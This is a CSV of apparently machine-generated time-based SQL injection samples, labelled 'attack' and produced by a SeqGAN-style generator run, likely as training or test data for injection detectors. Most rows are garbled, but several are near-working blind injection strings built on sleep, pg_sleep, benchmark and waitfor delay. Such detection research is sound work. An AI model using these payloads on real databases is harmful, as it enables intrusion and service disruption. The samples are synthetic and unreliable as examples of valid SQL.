label,payload,family,payload_type,method,run_id,sample_index
attack,"1%'   )    )     )   and sleep  (  5  )   and    (    (     (  'j'  =  '   )  =  '   ""zlal""'  ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,459
attack,1'   )   ))   )    )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,460
attack,10ffvy'  =  'c,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,461
attack,"1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'ofstf'  =  'v ""  =  ""   where 8514  =  0x4c4d6142  =  sleep  (  5  --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,462
attack,1 )      # (  (  5    )  (  5   e H  =  =  5  )    #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,463
attack,1    --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,464
attack,1  5  s and   (  (  (  5    )    (  )q)  select  sleep  (  2239 ' and   (  '  =  (  =  =  1210  =  =  (  1132  1132  (  =  0x6d457153  5  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,465
attack,1'  s)  #gyppdp,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,466
attack,"1'  )  )  )     xawp'  =  'n	   )    )      select (    =  5  sleep    (  (    (   (  (  =  0x6d457153,(  0x4c4d6142   )    )     )     )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,467
attack,"1 where 6967  5000000,md5  (  5  =   1210",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,468
attack,  0x4c4d6142   )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,469
attack,ddldowf,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,470
attack,1  )   )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,471
attack,sleep  5  )  )    )  )    )    (  vdpp   xin  select  =  0x544d5a4c   and  sleep  sleep  (  =  #  =  =  =  =  select pg_sleep)  =  benchmark  5  5874  5   --zpor --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,472
attack,"1'  "" and 8667  sleep    0x544d5a4c  #  sleep  5  )     ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,473
attack,"1'  (o  (  sleep  (  5   (  5   zlt  sleep  6866  )  # 'sa' , from,""  6272  )  sleep  =  =  =  =  =  2841  =  =  =  '",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,474
attack,waitfor sleep  0x544d5a4c  )  sleep  --  =  0x76555642   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,475
attack,"1%'   )    )     )   and sleep  (  5  )   and    (    (     (  'bhhrlinzlpnpen0c'  =  '     yq  =  =  =  5000000,=  =  =  0x544d5a4c  5  (  1915  select  like  5  6272#",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,476
attack,"1"" )  "" or  (  =select  select 6969 or    0x544d5a4c  or  sleep  (  =  =  (  sleep  (  5  (  '%'  8252  1210select  =  =  =  (  =  select from  5  select  =  s     or  )  ywhere '0:0:2'  ""  =  5  =  =  1  =  =  (  0x544d5a4c,mdd5  6272,sleep  5   )       '  (  select  select  =  (  =  >   )  )   sleep  (   )    )  (5  select  0x544d5a4c  )  (  (  =  =",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,477
attack,"1'   )    )     )   and sleep  (  5  )   and    (    (     (  '   jpkel1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 't  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,478
attack,"1"")   )  )  )    )     )    )    )    )    (  5   where "" (  =  select  =  =  (  =  =  =  5  )    )   (v",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,479
attack,1 pg_sleep  (  5  )  #u and  )  )  =  =  6969cuvt     0x6d457153  sleep  5    )  (  select  (  5=  )  --z  --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,480
attack,"1%"")  =  =  benchmark  =  =  5ldd1%"" from  )  0x76555642=  '",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,481
attack,1%      sleep  =  '  )  )   8252  )    )   )ors   kastiwaq,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,482
attack,1  )   or or elt  5   sleep  select  5  )     )  #v,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,483
attack,1%'  )   waitfor delay 'or(5  5   )    --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,484
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 's'  =  '  =  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,485
attack,1sleep  ( where 4683  =  5  )  )  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,486
attack,"  s fromif8252    =  (  =  (  =    =  =  5000000 or  =  benchmark  =  sleep  1568   orldo  #  where 0x544d5a4c  5  )    )    )    )  g    (  5  )  =  =  =  5000000or * sleep  select  =  5""",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,487
attack,1  =  sleep  5    (  9008   (  =  =  benchmark  5    )    )    )    or  s   and  =  =  =  =  =  select * 6967  5   )       )  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,488
attack,y5874,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,489
attack,"t  (  (  (  waitfor  (  sleep  5  )    )  )(  select 4240  =  =  1210  7196  (  5   )    )    )  (  select  5000000,'rnzp'  =  (  =  =  5    )    u   )    )    )    )    )    (  (  selectldd5  e    (  select  2044 or sleep  (  =  (  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,490
attack,"1""  )  )  )    )     )    a)    )    rmq#s",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,491
attack,"1""  0x694a4745  s xpt     )  #)  )  )  wyqzuwkny",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,492
attack,"1Z""s%",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,493
attack,1 or 4240  5  =  (  =  =  (  select  4240  =  #  0x544d5a4c    )    sleep  0x6d457153)     and(  =  =    )    ( * where   5  )  )    )    )    )    )   )   )    )   -- benchmark  (  (  =    =  (  (  1210  5   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,494
attack,"1  =  sleep  =  =   and 2388  5000000,)  5000000,2841  =  =  =  (  (  5  )  )     )  )  sdq  =  (  =    )  =  )    )  )  )  )    )    )  )    (  xh=  5   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,495
attack,"select or5  )  (  select  sleep  5  )  (  3114  5000000,md5  6272  2239  select  1132 or  5  #z",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,496
attack,"1<  =  =  select where (  5d  (  =  {      (  =  = waitfor where where benchmark  (  =  6272  =  =  =  =  =  1568  select  =  2239  (  =  =  5    )  benchmark  from,sleep  (  7196  =  =  sleep  (  waitfor,sleep  5  yq  5874  =5  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,497
attack,"  1132    (  (  select  =  =  =    (  select  1210,md5  (  5  (  12108485,sleep  5  )  #p",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,498
attack,"'   )   )    )  s,)    )   )    )    )    )   )    )    )   or or or   (        (    (  (  5  select (  3672 (  7021 or)  (  (  (  (    =  =  =  =  5  ynz",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,499
